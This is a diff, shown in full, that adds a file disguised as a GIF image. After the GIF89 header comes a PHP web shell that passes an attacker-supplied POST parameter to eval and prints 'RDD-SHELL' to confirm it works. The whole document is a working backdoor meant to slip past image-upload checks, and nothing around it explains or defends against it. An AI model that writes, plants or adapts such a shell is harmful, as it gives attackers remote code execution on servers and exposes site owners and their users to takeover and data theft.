@@ -1,0 +1,6 @@
+GIF89
+
+<?php
+    @eval($_POST["rdd"]);
+    echo "RDD-SHELL";
+?>
